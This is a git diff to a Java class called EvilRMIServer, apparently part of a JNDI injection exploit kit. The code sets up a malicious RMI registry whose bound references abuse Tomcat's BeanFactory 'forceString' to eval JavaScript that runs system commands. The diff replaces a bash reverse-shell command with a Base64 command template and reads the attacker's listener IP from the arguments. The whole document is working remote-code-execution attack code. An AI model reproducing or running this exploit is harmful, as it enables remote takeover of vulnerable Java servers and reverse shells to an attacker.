@@ -7,8 +7,6 @@ import java.rmi.registry.*;
 import javax.naming.*;
 import org.apache.naming.ResourceRef;
 
-import org.apache.naming.factory.BeanFactory;
-
 
 public class EvilRMIServer {
 
@@ -26,9 +24,9 @@ public class EvilRMIServer {
         ref.add(new StringRefAddr("forceString", "x=eval"));
         ref.add(new StringRefAddr("x", String.format(
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
-                        "\"new java.lang.ProcessBuilder['(java.lang.String[])'](['bash','-c','%s']).start()\"" +
+                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                         ")",
-                commandGenerator.reverseShellCommand
+                commandGenerator.getBase64CommandTpl()
         )));
         return new ReferenceWrapper(ref);
     }
@@ -57,7 +55,10 @@ public class EvilRMIServer {
 
         System.out.println("Creating evil RMI registry on port 1097");
         Registry registry = LocateRegistry.createRegistry(1097);
-        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener("IP",5555));
+        String ip = args[0];
+        System.out.println(ip);
+        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,5555));
+        System.setProperty("java.rmi.server.hostname",ip);
 
         registry.bind("ExecByEL",evilRMIServer.execByEL());
         registry.bind("ExecByGroovyParse",evilRMIServer.execByGroovyParse());
